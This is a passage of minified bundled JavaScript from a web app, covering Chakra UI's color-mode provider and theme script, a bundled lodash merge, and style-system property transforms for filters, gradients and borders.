                              return (
                                  e.appendChild(document.createTextNode("*{-webkit-transition:none!important;-moz-transition:none!important;-o-transition:none!important;-ms-transition:none!important;transition:none!important}")),
                                  document.head.appendChild(e),
                                  () => {
                                      window.getComputedStyle(document.body),
                                          requestAnimationFrame(() => {
                                              requestAnimationFrame(() => {
                                                  document.head.removeChild(e);
                                              });
                                          });
                                  }
                              );
                          },
                      };
                  return n;
              })({ preventTransition: a }),
          [a]
      ),
      g = "system" !== o || l ? l : u,
      v = D.useCallback(
          (e) => {
              const t = "system" === e ? f() : e;
              c(t), p("dark" === t), h(t), i.set(t);
          },
          [i, f, p, h]
      );
  Jm(() => {
      "system" === o && d(f());
  }, []),
      D.useEffect(() => {
          const e = i.get();
          v(e || ("system" !== o ? s : "system"));
      }, [i, s, o, v]);
  const y = D.useCallback(() => {
      v("dark" === g ? "light" : "dark");
  }, [g, v]);
  D.useEffect(() => {
      if (r) return m(v);
  }, [r, m, v]);
  const b = D.useMemo(() => ({ colorMode: null != t ? t : g, toggleColorMode: t ? fg : y, setColorMode: t ? fg : v, forced: void 0 !== t }), [g, y, v, t]);
  return Q.jsx(sg.Provider, { value: b, children: n });
}
hg.displayName = "ColorModeProvider";
var mg = new Set(["dark", "light", "system"]);
function gg(e = {}) {
  const { initialColorMode: t = "light", type: n = "localStorage", storageKey: r = "chakra-ui-color-mode" } = e,
      o = (function (e) {
          let t = e;
          return mg.has(t) || (t = "light"), t;
      })(t);
  return `!${
      "cookie" === n
          ? `(function(){try{var a=function(o){var l="(prefers-color-scheme: dark)",v=window.matchMedia(l).matches?"dark":"light",e=o==="system"?v:o,d=document.documentElement,m=document.body,i="chakra-ui-light",n="chakra-ui-dark",s=e==="dark";return m.classList.add(s?n:i),m.classList.remove(s?i:n),d.style.colorScheme=e,d.dataset.theme=e,e},u=a,h="${o}",r="${r}",t=document.cookie.match(new RegExp("(^| )".concat(r,"=([^;]+)"))),c=t?t[2]:null;c?a(c):document.cookie="".concat(r,"=").concat(a(h),"; max-age=31536000; path=/")}catch(a){}})();\n  `
          : `(function(){try{var a=function(c){var v="(prefers-color-scheme: dark)",h=window.matchMedia(v).matches?"dark":"light",r=c==="system"?h:c,o=document.documentElement,s=document.body,l="chakra-ui-light",d="chakra-ui-dark",i=r==="dark";return s.classList.add(i?d:l),s.classList.remove(i?l:d),o.style.colorScheme=r,o.dataset.theme=r,r},n=a,m="${o}",e="${r}",t=localStorage.getItem(e);t?a(t):localStorage.setItem(e,a(m))}catch(a){}})();\n  `
  }`.trim();
}
function vg(e = {}) {
  const { nonce: t } = e;
  return Q.jsx("script", { id: "chakra-script", nonce: t, dangerouslySetInnerHTML: { __html: gg(e) } });
}
function yg() {
  return {
      ...lg(),
      theme: (function () {
          const e = D.useContext(Dm);
          if (!e) throw Error("useTheme: `theme` is undefined. Seems you forgot to wrap your app in `<ChakraProvider />` or `<ThemeProvider />`");
          return e;
      })(),
  };
}
var bg = (...e) => e.filter(Boolean).join(" ");
function xg(e) {
  const t = typeof e;
  return null != e && ("object" === t || "function" === t) && !Array.isArray(e);
}
function wg(e, ...t) {
  return Sg(e) ? e(...t) : e;
}
var Sg = (e) => "function" == typeof e,
  kg = (e) => (e ? "" : void 0),
  Eg = (e) => !!e || void 0;
function Cg(...e) {
  return function (t) {
      e.some((e) => (null == e || e(t), null == t ? void 0 : t.defaultPrevented));
  };
}
var _g = { exports: {} };
!(function (e, n) {
  var r = "__lodash_hash_undefined__",
      o = 9007199254740991,
      a = "[object Arguments]",
      i = "[object AsyncFunction]",
      s = "[object Function]",
      l = "[object GeneratorFunction]",
      c = "[object Null]",
      u = "[object Object]",
      d = "[object Proxy]",
      f = "[object Undefined]",
      p = /^\[object .+?Constructor\]$/,
      h = /^(?:0|[1-9]\d*)$/,
      m = {};
  (m["[object Float32Array]"] = m["[object Float64Array]"] = m["[object Int8Array]"] = m["[object Int16Array]"] = m["[object Int32Array]"] = m["[object Uint8Array]"] = m["[object Uint8ClampedArray]"] = m["[object Uint16Array]"] = m[
      "[object Uint32Array]"
  ] = !0),
      (m[a] = m["[object Array]"] = m["[object ArrayBuffer]"] = m["[object Boolean]"] = m["[object DataView]"] = m["[object Date]"] = m["[object Error]"] = m[s] = m["[object Map]"] = m["[object Number]"] = m[u] = m["[object RegExp]"] = m[
          "[object Set]"
      ] = m["[object String]"] = m["[object WeakMap]"] = !1);
  var g = "object" == typeof t && t && t.Object === Object && t,
      v = "object" == typeof self && self && self.Object === Object && self,
      y = g || v || Function("return this")(),
      b = n && !n.nodeType && n,
      x = b && e && !e.nodeType && e,
      w = x && x.exports === b,
      S = w && g.process,
      k = (function () {
          try {
              var e = x && x.require && x.require("util").types;
              return e || (S && S.binding && S.binding("util"));
          } catch (gF) {}
      })(),
      E = k && k.isTypedArray;
  var C,
      _,
      P,
      T = Array.prototype,
      R = Function.prototype,
      z = Object.prototype,
      A = y["__core-js_shared__"],
      j = R.toString,
      O = z.hasOwnProperty,
      F = (C = /[^.]+$/.exec((A && A.keys && A.keys.IE_PROTO) || "")) ? "Symbol(src)_1." + C : "",
      N = z.toString,
      M = j.call(Object),
      L = RegExp(
          "^" +
              j
                  .call(O)
                  .replace(/[\\^$.*+?()[\]{}|]/g, "\\$&")
                  .replace(/hasOwnProperty|(function).*?(?=\\\()| for .+?(?=\\\])/g, "$1.*?") +
              "$"
      ),
      B = w ? y.Buffer : void 0,
      I = y.Symbol,
      D = y.Uint8Array,
      $ = B ? B.allocUnsafe : void 0,
      V =
          ((_ = Object.getPrototypeOf),
          (P = Object),
          function (e) {
              return _(P(e));
          }),
      U = Object.create,
      W = z.propertyIsEnumerable,
      H = T.splice,
      q = I ? I.toStringTag : void 0,
      Y = (function () {
          try {
              var e = be(Object, "defineProperty");
              return e({}, "", {}), e;
          } catch (gF) {}
      })(),
      X = B ? B.isBuffer : void 0,
      G = Math.max,
      Q = Date.now,
      K = be(y, "Map"),
      Z = be(Object, "create"),
      J = (function () {
          function e() {}
          return function (t) {
              if (!Ae(t)) return {};
              if (U) return U(t);
              e.prototype = t;
              var n = new e();
              return (e.prototype = void 0), n;
          };
      })();
  function ee(e) {
      var t = -1,
          n = null == e ? 0 : e.length;
      for (this.clear(); ++t < n; ) {
          var r = e[t];
          this.set(r[0], r[1]);
      }
  }
  function te(e) {
      var t = -1,
          n = null == e ? 0 : e.length;
      for (this.clear(); ++t < n; ) {
          var r = e[t];
          this.set(r[0], r[1]);
      }
  }
  function ne(e) {
      var t = -1,
          n = null == e ? 0 : e.length;
      for (this.clear(); ++t < n; ) {
          var r = e[t];
          this.set(r[0], r[1]);
      }
  }
  function re(e) {
      var t = (this.__data__ = new te(e));
      this.size = t.size;
  }
  function oe(e, t) {
      var n = _e(e),
          r = !n && Ce(e),
          o = !n && !r && Te(e),
          a = !n && !r && !o && Oe(e),
          i = n || r || o || a,
          s = i
              ? (function (e, t) {
                    for (var n = -1, r = Array(e); ++n < e; ) r[n] = t(n);
                    return r;
                })(e.length, String)
              : [],
          l = s.length;
      for (var c in e) (!t && !O.call(e, c)) || (i && ("length" == c || (o && ("offset" == c || "parent" == c)) || (a && ("buffer" == c || "byteLength" == c || "byteOffset" == c)) || xe(c, l))) || s.push(c);
      return s;
  }
  function ae(e, t, n) {
      ((void 0 !== n && !Ee(e[t], n)) || (void 0 === n && !(t in e))) && le(e, t, n);
  }
  function ie(e, t, n) {
      var r = e[t];
      (O.call(e, t) && Ee(r, n) && (void 0 !== n || t in e)) || le(e, t, n);
  }
  function se(e, t) {
      for (var n = e.length; n--; ) if (Ee(e[n][0], t)) return n;
      return -1;
  }
  function le(e, t, n) {
      "__proto__" == t && Y ? Y(e, t, { configurable: !0, enumerable: !0, value: n, writable: !0 }) : (e[t] = n);
  }
  (ee.prototype.clear = function () {
      (this.__data__ = Z ? Z(null) : {}), (this.size = 0);
  }),
      (ee.prototype.delete = function (e) {
          var t = this.has(e) && delete this.__data__[e];
          return (this.size -= t ? 1 : 0), t;
      }),
      (ee.prototype.get = function (e) {
          var t = this.__data__;
          if (Z) {
              var n = t[e];
              return n === r ? void 0 : n;
          }
          return O.call(t, e) ? t[e] : void 0;
      }),
      (ee.prototype.has = function (e) {
          var t = this.__data__;
          return Z ? void 0 !== t[e] : O.call(t, e);
      }),
      (ee.prototype.set = function (e, t) {
          var n = this.__data__;
          return (this.size += this.has(e) ? 0 : 1), (n[e] = Z && void 0 === t ? r : t), this;
      }),
      (te.prototype.clear = function () {
          (this.__data__ = []), (this.size = 0);
      }),
      (te.prototype.delete = function (e) {
          var t = this.__data__,
              n = se(t, e);
          return !(n < 0) && (n == t.length - 1 ? t.pop() : H.call(t, n, 1), --this.size, !0);
      }),
      (te.prototype.get = function (e) {
          var t = this.__data__,
              n = se(t, e);
          return n < 0 ? void 0 : t[n][1];
      }),
      (te.prototype.has = function (e) {
          return se(this.__data__, e) > -1;
      }),
      (te.prototype.set = function (e, t) {
          var n = this.__data__,
              r = se(n, e);
          return r < 0 ? (++this.size, n.push([e, t])) : (n[r][1] = t), this;
      }),
      (ne.prototype.clear = function () {
          (this.size = 0), (this.__data__ = { hash: new ee(), map: new (K || te)(), string: new ee() });
      }),
      (ne.prototype.delete = function (e) {
          var t = ye(this, e).delete(e);
          return (this.size -= t ? 1 : 0), t;
      }),
      (ne.prototype.get = function (e) {
          return ye(this, e).get(e);
      }),
      (ne.prototype.has = function (e) {
          return ye(this, e).has(e);
      }),
      (ne.prototype.set = function (e, t) {
          var n = ye(this, e),
              r = n.size;
          return n.set(e, t), (this.size += n.size == r ? 0 : 1), this;
      }),
      (re.prototype.clear = function () {
          (this.__data__ = new te()), (this.size = 0);
      }),
      (re.prototype.delete = function (e) {
          var t = this.__data__,
              n = t.delete(e);
          return (this.size = t.size), n;
      }),
      (re.prototype.get = function (e) {
          return this.__data__.get(e);
      }),
      (re.prototype.has = function (e) {
          return this.__data__.has(e);
      }),
      (re.prototype.set = function (e, t) {
          var n = this.__data__;
          if (n instanceof te) {
              var r = n.__data__;
              if (!K || r.length < 199) return r.push([e, t]), (this.size = ++n.size), this;
              n = this.__data__ = new ne(r);
          }
          return n.set(e, t), (this.size = n.size), this;
      });
  var ce,
      ue = function (e, t, n) {
          for (var r = -1, o = Object(e), a = n(e), i = a.length; i--; ) {
              var s = a[ce ? i : ++r];
              if (!1 === t(o[s], s, o)) break;
          }
          return e;
      };
  function de(e) {
      return null == e
          ? void 0 === e
              ? f
              : c
          : q && q in Object(e)
          ? (function (e) {
                var t = O.call(e, q),
                    n = e[q];
                try {
                    e[q] = void 0;
                    var r = !0;
                } catch (gF) {}
                var o = N.call(e);
                r && (t ? (e[q] = n) : delete e[q]);
                return o;
            })(e)
          : (function (e) {
                return N.call(e);
            })(e);
  }
  function fe(e) {
      return je(e) && de(e) == a;
  }
  function pe(e) {
      return (
          !(
              !Ae(e) ||
              (function (e) {
                  return !!F && F in e;
              })(e)
          ) &&
          (Re(e) ? L : p).test(
              (function (e) {
                  if (null != e) {
                      try {
                          return j.call(e);
                      } catch (gF) {}
                      try {
                          return e + "";
                      } catch (gF) {}
                  }
                  return "";
              })(e)
          )
      );
  }
  function he(e) {
      if (!Ae(e))
          return (function (e) {
              var t = [];
              if (null != e) for (var n in Object(e)) t.push(n);
              return t;
          })(e);
      var t = we(e),
          n = [];
      for (var r in e) ("constructor" != r || (!t && O.call(e, r))) && n.push(r);
      return n;
  }
  function me(e, t, n, r, o) {
      e !== t &&
          ue(
              t,
              function (a, i) {
                  if ((o || (o = new re()), Ae(a)))
                      !(function (e, t, n, r, o, a, i) {
                          var s = Se(e, n),
                              l = Se(t, n),
                              c = i.get(l);
                          if (c) return void ae(e, n, c);
                          var d = a ? a(s, l, n + "", e, t, i) : void 0,
                              f = void 0 === d;
                          if (f) {
                              var p = _e(l),
                                  h = !p && Te(l),
                                  m = !p && !h && Oe(l);
                              (d = l),
                                  p || h || m
                                      ? _e(s)
                                          ? (d = s)
                                          : je((x = s)) && Pe(x)
                                          ? (d = (function (e, t) {
                                                var n = -1,
                                                    r = e.length;
                                                t || (t = Array(r));
                                                for (; ++n < r; ) t[n] = e[n];
                                                return t;
                                            })(s))
                                          : h
                                          ? ((f = !1),
                                            (d = (function (e, t) {
                                                if (t) return e.slice();
                                                var n = e.length,
                                                    r = $ ? $(n) : new e.constructor(n);
                                                return e.copy(r), r;
                                            })(l, !0)))
                                          : m
                                          ? ((f = !1), (g = l), (v = !0 ? ((y = g.buffer), (b = new y.constructor(y.byteLength)), new D(b).set(new D(y)), b) : g.buffer), (d = new g.constructor(v, g.byteOffset, g.length)))
                                          : (d = [])
                                      : (function (e) {
                                            if (!je(e) || de(e) != u) return !1;
                                            var t = V(e);
                                            if (null === t) return !0;
                                            var n = O.call(t, "constructor") && t.constructor;
                                            return "function" == typeof n && n instanceof n && j.call(n) == M;
                                        })(l) || Ce(l)
                                      ? ((d = s),
                                        Ce(s)
                                            ? (d = (function (e) {
                                                  return (function (e, t, n, r) {
                                                      var o = !n;
                                                      n || (n = {});
                                                      var a = -1,
                                                          i = t.length;
                                                      for (; ++a < i; ) {
                                                          var s = t[a],
                                                              l = r ? r(n[s], e[s], s, n, e) : void 0;
                                                          void 0 === l && (l = e[s]), o ? le(n, s, l) : ie(n, s, l);
                                                      }
                                                      return n;
                                                  })(e, Fe(e));
                                              })(s))
                                            : (Ae(s) && !Re(s)) ||
                                              (d = (function (e) {
                                                  return "function" != typeof e.constructor || we(e) ? {} : J(V(e));
                                              })(l)))
                                      : (f = !1);
                          }
                          var g, v, y, b;
                          var x;
                          f && (i.set(l, d), o(d, l, r, a, i), i.delete(l));
                          ae(e, n, d);
                      })(e, t, i, n, me, r, o);
                  else {
                      var s = r ? r(Se(e, i), a, i + "", e, t, o) : void 0;
                      void 0 === s && (s = a), ae(e, i, s);
                  }
              },
              Fe
          );
  }
  function ge(e, t) {
      return ke(
          (function (e, t, n) {
              return (
                  (t = G(void 0 === t ? e.length - 1 : t, 0)),
                  function () {
                      for (var r = arguments, o = -1, a = G(r.length - t, 0), i = Array(a); ++o < a; ) i[o] = r[t + o];
                      o = -1;
                      for (var s = Array(t + 1); ++o < t; ) s[o] = r[o];
                      return (
                          (s[t] = n(i)),
                          (function (e, t, n) {
                              switch (n.length) {
                                  case 0:
                                      return e.call(t);
                                  case 1:
                                      return e.call(t, n[0]);
                                  case 2:
                                      return e.call(t, n[0], n[1]);
                                  case 3:
                                      return e.call(t, n[0], n[1], n[2]);
                              }
                              return e.apply(t, n);
                          })(e, this, s)
                      );
                  }
              );
          })(e, t, Le),
          e + ""
      );
  }
  var ve = Y
      ? function (e, t) {
            return Y(e, "toString", {
                configurable: !0,
                enumerable: !1,
                value:
                    ((n = t),
                    function () {
                        return n;
                    }),
                writable: !0,
            });
            var n;
        }
      : Le;
  function ye(e, t) {
      var n,
          r,
          o = e.__data__;
      return ("string" == (r = typeof (n = t)) || "number" == r || "symbol" == r || "boolean" == r ? "__proto__" !== n : null === n) ? o["string" == typeof t ? "string" : "hash"] : o.map;
  }
  function be(e, t) {
      var n = (function (e, t) {
          return null == e ? void 0 : e[t];
      })(e, t);
      return pe(n) ? n : void 0;
  }
  function xe(e, t) {
      var n = typeof e;
      return !!(t = null == t ? o : t) && ("number" == n || ("symbol" != n && h.test(e))) && e > -1 && e % 1 == 0 && e < t;
  }
  function we(e) {
      var t = e && e.constructor;
      return e === (("function" == typeof t && t.prototype) || z);
  }
  function Se(e, t) {
      if (("constructor" !== t || "function" != typeof e[t]) && "__proto__" != t) return e[t];
  }
  var ke = (function (e) {
      var t = 0,
          n = 0;
      return function () {
          var r = Q(),
              o = 16 - (r - n);
          if (((n = r), o > 0)) {
              if (++t >= 800) return arguments[0];
          } else t = 0;
          return e.apply(void 0, arguments);
      };
  })(ve);
  function Ee(e, t) {
      return e === t || (e != e && t != t);
  }
  var Ce = fe(
          (function () {
              return arguments;
          })()
      )
          ? fe
          : function (e) {
                return je(e) && O.call(e, "callee") && !W.call(e, "callee");
            },
      _e = Array.isArray;
  function Pe(e) {
      return null != e && ze(e.length) && !Re(e);
  }
  var Te =
      X ||
      function () {
          return !1;
      };
  function Re(e) {
      if (!Ae(e)) return !1;
      var t = de(e);
      return t == s || t == l || t == i || t == d;
  }
  function ze(e) {
      return "number" == typeof e && e > -1 && e % 1 == 0 && e <= o;
  }
  function Ae(e) {
      var t = typeof e;
      return null != e && ("object" == t || "function" == t);
  }
  function je(e) {
      return null != e && "object" == typeof e;
  }
  var Oe = E
      ? (function (e) {
            return function (t) {
                return e(t);
            };
        })(E)
      : function (e) {
            return je(e) && ze(e.length) && !!m[de(e)];
        };
  function Fe(e) {
      return Pe(e) ? oe(e, !0) : he(e);
  }
  var Ne,
      Me =
          ((Ne = function (e, t, n, r) {
              me(e, t, n, r);
          }),
          ge(function (e, t) {
              var n = -1,
                  r = t.length,
                  o = r > 1 ? t[r - 1] : void 0,
                  a = r > 2 ? t[2] : void 0;
              for (
                  o = Ne.length > 3 && "function" == typeof o ? (r--, o) : void 0,
                      a &&
                          (function (e, t, n) {
                              if (!Ae(n)) return !1;
                              var r = typeof t;
                              return !!("number" == r ? Pe(n) && xe(t, n.length) : "string" == r && (t in n)) && Ee(n[t], e);
                          })(t[0], t[1], a) &&
                          ((o = r < 3 ? void 0 : o), (r = 1)),
                      e = Object(e);
                  ++n < r;

              ) {
                  var i = t[n];
                  i && Ne(e, i, n, o);
              }
              return e;
          }));
  function Le(e) {
      return e;
  }
  e.exports = Me;
})(_g, _g.exports);
const Pg = n(_g.exports);
var Tg = (e) => ("string" == typeof e ? e.replace(/!(important)?$/, "").trim() : e),
  Rg = (e, t) => (n) => {
      const r = String(t),
          o = ((e) => /!(important)?$/.test(e))(r),
          a = Tg(r),
          i = e ? `${e}.${a}` : a;
      let s = xg(n.__cssMap) && i in n.__cssMap ? n.__cssMap[i].varRef : t;
      return (s = Tg(s)), o ? `${s} !important` : s;
  };
function zg(e) {
  const { scale: t, transform: n, compose: r } = e;
  return (e, o) => {
      var a;
      const i = Rg(t, e)(o);
      let s = null != (a = null == n ? void 0 : n(i, o)) ? a : i;
      return r && (s = r(s, o)), s;
  };
}
var Ag = (...e) => (t) => e.reduce((e, t) => t(e), t);
function jg(e, t) {
  return (n) => {
      const r = { property: n, scale: e };
      return (r.transform = zg({ scale: e, transform: t })), r;
  };
}
var Og = ({ rtl: e, ltr: t }) => (n) => ("rtl" === n.direction ? e : t);
var Fg = ["rotate(var(--chakra-rotate, 0))", "scaleX(var(--chakra-scale-x, 1))", "scaleY(var(--chakra-scale-y, 1))", "skewX(var(--chakra-skew-x, 0))", "skewY(var(--chakra-skew-y, 0))"];
var Ng = {
      "--chakra-blur": "var(--chakra-empty,/*!*/ /*!*/)",
      "--chakra-brightness": "var(--chakra-empty,/*!*/ /*!*/)",
      "--chakra-contrast": "var(--chakra-empty,/*!*/ /*!*/)",
      "--chakra-grayscale": "var(--chakra-empty,/*!*/ /*!*/)",
      "--chakra-hue-rotate": "var(--chakra-empty,/*!*/ /*!*/)",
      "--chakra-invert": "var(--chakra-empty,/*!*/ /*!*/)",
      "--chakra-saturate": "var(--chakra-empty,/*!*/ /*!*/)",
      "--chakra-sepia": "var(--chakra-empty,/*!*/ /*!*/)",
      "--chakra-drop-shadow": "var(--chakra-empty,/*!*/ /*!*/)",
      filter: [
          "var(--chakra-blur)",
          "var(--chakra-brightness)",
          "var(--chakra-contrast)",
          "var(--chakra-grayscale)",
          "var(--chakra-hue-rotate)",
          "var(--chakra-invert)",
          "var(--chakra-saturate)",
          "var(--chakra-sepia)",
          "var(--chakra-drop-shadow)",
      ].join(" "),
  },
  Mg = {
      backdropFilter: [
          "var(--chakra-backdrop-blur)",
          "var(--chakra-backdrop-brightness)",
          "var(--chakra-backdrop-contrast)",
          "var(--chakra-backdrop-grayscale)",
          "var(--chakra-backdrop-hue-rotate)",
          "var(--chakra-backdrop-invert)",
          "var(--chakra-backdrop-opacity)",
          "var(--chakra-backdrop-saturate)",
          "var(--chakra-backdrop-sepia)",
      ].join(" "),
      "--chakra-backdrop-blur": "var(--chakra-empty,/*!*/ /*!*/)",
      "--chakra-backdrop-brightness": "var(--chakra-empty,/*!*/ /*!*/)",
      "--chakra-backdrop-contrast": "var(--chakra-empty,/*!*/ /*!*/)",
      "--chakra-backdrop-grayscale": "var(--chakra-empty,/*!*/ /*!*/)",
      "--chakra-backdrop-hue-rotate": "var(--chakra-empty,/*!*/ /*!*/)",
      "--chakra-backdrop-invert": "var(--chakra-empty,/*!*/ /*!*/)",
      "--chakra-backdrop-opacity": "var(--chakra-empty,/*!*/ /*!*/)",
      "--chakra-backdrop-saturate": "var(--chakra-empty,/*!*/ /*!*/)",
      "--chakra-backdrop-sepia": "var(--chakra-empty,/*!*/ /*!*/)",
  };
var Lg = { "row-reverse": { space: "--chakra-space-x-reverse", divide: "--chakra-divide-x-reverse" }, "column-reverse": { space: "--chakra-space-y-reverse", divide: "--chakra-divide-y-reverse" } },
  Bg = { "to-t": "to top", "to-tr": "to top right", "to-r": "to right", "to-br": "to bottom right", "to-b": "to bottom", "to-bl": "to bottom left", "to-l": "to left", "to-tl": "to top left" },
  Ig = new Set(Object.values(Bg)),
  Dg = new Set(["none", "-moz-initial", "inherit", "initial", "revert", "unset"]),
  $g = (e) => e.trim();
var Vg = (e) => "string" == typeof e && e.includes("(") && e.includes(")");
var Ug = (e) => (t) => `${e}(${t})`,
  Wg = {
      filter: (e) => ("auto" !== e ? e : Ng),
      backdropFilter: (e) => ("auto" !== e ? e : Mg),
      ring: (e) =>
          (function (e) {
              return {
                  "--chakra-ring-offset-shadow": "var(--chakra-ring-inset) 0 0 0 var(--chakra-ring-offset-width) var(--chakra-ring-offset-color)",
                  "--chakra-ring-shadow": "var(--chakra-ring-inset) 0 0 0 calc(var(--chakra-ring-width) + var(--chakra-ring-offset-width)) var(--chakra-ring-color)",
                  "--chakra-ring-width": e,
                  boxShadow: ["var(--chakra-ring-offset-shadow)", "var(--chakra-ring-shadow)", "var(--chakra-shadow, 0 0 #0000)"].join(", "),
              };
          })(Wg.px(e)),
      bgClip: (e) => ("text" === e ? { color: "transparent", backgroundClip: "text" } : { backgroundClip: e }),
      transform: (e) =>
          "auto" === e
              ? ["translateX(var(--chakra-translate-x, 0))", "translateY(var(--chakra-translate-y, 0))", ...Fg].join(" ")
              : "auto-gpu" === e
              ? ["translate3d(var(--chakra-translate-x, 0), var(--chakra-translate-y, 0), 0)", ...Fg].join(" ")
              : e,
      vh: (e) => ("$100vh" === e ? "var(--chakra-vh)" : e),
      px(e) {
          if (null == e) return e;
          const { unitless: t } = ((e) => {
              const t = parseFloat(e.toString()),
                  n = e.toString().replace(String(t), "");
              return { unitless: !n, value: t, unit: n };
          })(e);
          return t || "number" == typeof e ? `${e}px` : e;
      },
      fraction: (e) => ("number" != typeof e || e > 1 ? e : 100 * e + "%"),
      float: (e, t) => ("rtl" === t.direction ? { left: "right", right: "left" }[e] : e),
      degree(e) {
          if (
              (function (e) {
                  return /^var\(--.+\)$/.test(e);
              })(e) ||
              null == e
          )
              return e;
          const t = "string" == typeof e && !e.endsWith("deg");
          return "number" == typeof e || t ? `${e}deg` : e;
      },
      gradient: (e, t) =>
          (function (e, t) {
              if (null == e || Dg.has(e)) return e;
              if (!Vg(e) && !Dg.has(e)) return `url('${e}')`;
              const n = /(^[a-z-A-Z]+)\((.*)\)/g.exec(e),
                  r = null == n ? void 0 : n[1],
                  o = null == n ? void 0 : n[2];
              if (!r || !o) return e;
              const a = r.includes("-gradient") ? r : `${r}-gradient`,
                  [i, ...s] = o.split(",").map($g).filter(Boolean);
              if (0 === (null == s ? void 0 : s.length)) return e;
              const l = i in Bg ? Bg[i] : i;
              s.unshift(l);
              const c = s.map((e) => {
                  if (Ig.has(e)) return e;
                  const n = e.indexOf(" "),
                      [r, o] = -1 !== n ? [e.substr(0, n), e.substr(n + 1)] : [e],
                      a = Vg(o) ? o : o && o.split(" "),
                      i = `colors.${r}`,
                      s = i in t.__cssMap ? t.__cssMap[i].varRef : r;
                  return a ? [s, ...(Array.isArray(a) ? a : [a])].join(" ") : s;
              });
              return `${a}(${c.join(", ")})`;
          })(e, null != t ? t : {}),
      blur: Ug("blur"),
      opacity: Ug("opacity"),
      brightness: Ug("brightness"),
      contrast: Ug("contrast"),
      dropShadow: Ug("drop-shadow"),
      grayscale: Ug("grayscale"),
      hueRotate: Ug("hue-rotate"),
      invert: Ug("invert"),
      saturate: Ug("saturate"),
      sepia: Ug("sepia"),
      bgImage(e) {
          if (null == e) return e;
          return Vg(e) || Dg.has(e) ? e : `url(${e})`;
      },
      outline(e) {
          const t = "0" === String(e) || "none" === String(e);
          return null !== e && t ? { outline: "2px solid transparent", outlineOffset: "2px" } : { outline: e };
      },
      flexDirection(e) {
          var t;
          const { space: n, divide: r } = null != (t = Lg[e]) ? t : {},
              o = { flexDirection: e };
          return n && (o[n] = 1), r && (o[r] = 1), o;
      },
  },
  Hg = {
      borderWidths: jg("borderWidths"),
      borderStyles: jg("borderStyles"),
      colors: jg("colors"),
      borders: jg("borders"),
      gradients: jg("gradients", Wg.gradient),
      radii: jg("radii", Wg.px),
      space: jg("space", Ag(Wg.vh, Wg.px)),
      spaceT: jg("space", Ag(Wg.vh, Wg.px)),
      degreeT: (e) => ({ property: e, transform: Wg.degree }),
      prop: (e, t, n) => ({ property: e, scale: t, ...(t && { transform: zg({ scale: t, transform: n }) }) }),
      propT: (e, t) => ({ property: e, transform: t }),
      sizes: jg("sizes", Ag(Wg.vh, Wg.px)),
      sizesT: jg("sizes", Ag(Wg.vh, Wg.fraction)),
      shadows: jg("shadows"),
      logical: function (e) {
          const { property: t, scale: n, transform: r } = e;
          return { scale: n, property: Og(t), transform: n ? zg({ scale: n, compose: r }) : r };
      },
      blur: jg("blur", Wg.blur),
  },
  qg = {
      background: Hg.colors("background"),
      backgroundColor: Hg.colors("backgroundColor"),
      backgroundImage: Hg.gradients("backgroundImage"),
      backgroundSize: !0,
      backgroundPosition: !0,
      backgroundRepeat: !0,
      backgroundAttachment: !0,
      backgroundClip: { transform: Wg.bgClip },
      bgSize: Hg.prop("backgroundSize"),
      bgPosition: Hg.prop("backgroundPosition"),
      bg: Hg.colors("background"),
      bgColor: Hg.colors("backgroundColor"),
      bgPos: Hg.prop("backgroundPosition"),
      bgRepeat: Hg.prop("backgroundRepeat"),
      bgAttachment: Hg.prop("backgroundAttachment"),
      bgGradient: Hg.gradients("backgroundImage"),
      bgClip: { transform: Wg.bgClip },
  };
Object.assign(qg, { bgImage: qg.backgroundImage, bgImg: qg.backgroundImage });
var Yg = {
  border: Hg.borders("border"),
  borderWidth: Hg.borderWidths("borderWidth"),
  borderStyle: Hg.borderStyles("borderStyle"),
  borderColor: Hg.colors("borderColor"),
  borderRadius: Hg.radii("borderRadius"),
  borderTop: Hg.borders("borderTop"),
  borderBlockStart: Hg.borders("borderBlockStart"),
  borderTopLeftRadius: Hg.radii("borderTopLeftRadius"),
  borderStartStartRadius: Hg.logical({ scale: "radii", property: { ltr: "borderTopLeftRadius", rtl: "borderTopRightRadius" } }),
  borderEndStartRadius: Hg.logical({ scale: "radii", property: { ltr: "borderBottomLeftRadius", rtl: "borderBottomRightRadius" } }),
  borderTopRightRadius: Hg.radii("borderTopRightRadius"),
  borderStartEndRadius: Hg.logical({ scale: "radii", property: { ltr: "borderTopRightRadius", rtl: "borderTopLeftRadius" } }),
  borderEndEndRadius: Hg.logical({ scale: "radii", property: { ltr: "borderBottomRightRadius", rtl: "borderBottomLeftRadius" } }),
  borderRight: Hg.borders("borderRight"),
  borderInlineEnd: Hg.borders("borderInlineEnd"),
  borderBottom: Hg.borders("borderBottom"),
  borderBlockEnd: Hg.borders("borderBlockEnd"),
  borderBottomLeftRadius: Hg.radii("borderBottomLeftRadius"),
  borderBottomRightRadius: Hg.radii("borderBottomRightRadius"),
  borderLeft: Hg.borders("borderLeft"),
  borderInlineStart: { property: "borderInlineStart", scale: "borders" },
  borderInlineStartRadius: Hg.logical({ scale: "radii", property: { ltr: ["borderTopLeftRadius", "borderBottomLeftRadius"], rtl: ["borderTopRightRadius", "borderBottomRightRadius"] } }),
  borderInlineEndRadius: Hg.logical({ scale: "radii", property: { ltr: ["borderTopRightRadius", "borderBottomRightRadius"], rtl: ["borderTopLeftRadius", "borderBottomLeftRadius"] } }),
  borderX: Hg.borders(["borderLeft", "borderRight"]),
  borderInline: Hg.borders("borderInline"),
  borderY: Hg.borders(["borderTop", "borderBottom"]),
  borderBlock: Hg.borders("borderBlock"),
  borderTopWidth: Hg.borderWidths("borderTopWidth"),
  borderBlockStartWidth: Hg.borderWidths("borderBlockStartWidth"),
  borderTopColor: Hg.colors("borderTopColor"),
  borderBlockStartColor: Hg.colors("borderBlockStartColor"),
  borderTopStyle: Hg.borderStyles("borderTopStyle"),
  borderBlockStartStyle: Hg.borderStyles("borderBlockStartStyle"),
  borderBottomWidth: Hg.borderWidths("borderBottomWidth"),
  borderBlockEndWidth: Hg.borderWidths("borderBlockEndWidth"),
  borderBottomColor: Hg.colors("borderBottomColor"),
  borderBlockEndColor: Hg.colors("borderBlockEndColor"),
  borderBottomStyle: Hg.borderStyles("borderBottomStyle"),
  borderBlockEndStyle: Hg.borderStyles("borderBlockEndStyle"),
  borderLeftWidth: Hg.borderWidths("borderLeftWidth"),
  borderInlineStartWidth: Hg.borderWidths("borderInlineStartWidth"),
  borderLeftColor: Hg.colors("borderLeftColor"),
  borderInlineStartColor: Hg.colors("borderInlineStartColor"),
  borderLeftStyle: Hg.borderStyles("borderLeftStyle"),
  borderInlineStartStyle: Hg.borderStyles("borderInlineStartStyle"),
  borderRightWidth: Hg.borderWidths("borderRightWidth"),
